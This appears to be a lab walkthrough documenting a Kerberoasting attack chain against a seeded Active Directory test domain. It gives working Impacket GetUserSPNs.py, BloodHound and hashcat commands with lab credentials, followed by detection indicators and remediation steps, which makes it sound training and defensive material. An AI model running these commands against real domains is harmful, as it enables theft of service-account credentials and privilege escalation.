# Attack Chain 01 — Kerberoasting (T1558.003)

**Target:** `svc_sql@lab.local` (seeded by `30-seed-misconfigs.yml`)
**Tools:** Impacket `GetUserSPNs.py`, Hashcat
**Required access:** any authenticated domain user (e.g. `jdoe`)

## 1. Recon — discover SPN-backed accounts

From `jump01`:

```bash
source /opt/lab-venv/bin/activate
GetUserSPNs.py -dc-ip 10.10.10.10 lab.local/jdoe:'Welcome2026!' -request
```

Expected result: the TGS-REP hash for `svc_sql` is returned because the
account has the SPN `MSSQLSVC/sql01.lab.local:1433` registered.

BloodHound confirms the path:

```bash
bloodhound-python -d lab.local -u jdoe -p 'Welcome2026!' -gc dc01.lab.local -c All
```

## 2. Crack offline

```bash
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt --force
```

The seeded password `Svc_Summer2026!` cracks quickly — demonstrating why
service-account password policy matters.

## 3. Post-exploitation pivot

The cracked credential grants access under the service account's identity.
Re-run BloodHound to enumerate what `svc_sql` can reach (the seeded GenericAll
ACL in chain 02 makes this account a direct privilege-escalation pivot).

## 4. Detection

| Source | Indicator |
|---|---|
| Sysmon EID 3 | Unusual host initiating LDAP/Kerberos traffic to the DC, requesting many TGS tickets in a short window |
| Security EID 4769 | RC4 encryption type (0x17) TGS requests for SPN accounts from non-service hosts |

Sigma rule: [`../detections/sigma/kerberoast.yml`](../detections/sigma/kerberoast.yml)

## 5. Remediation

1. Service accounts: 25+ character generated passwords, managed by a vault / gMSA.
2. Enforce AES Kerberos encryption (disable RC4) so `hashcat -m 13100` no longer applies.
3. Alert on 4769 volume anomalies and RC4-ETYPE requests.
4. Regular ACL review (BloodHound) to remove unnecessary SPN assignments.
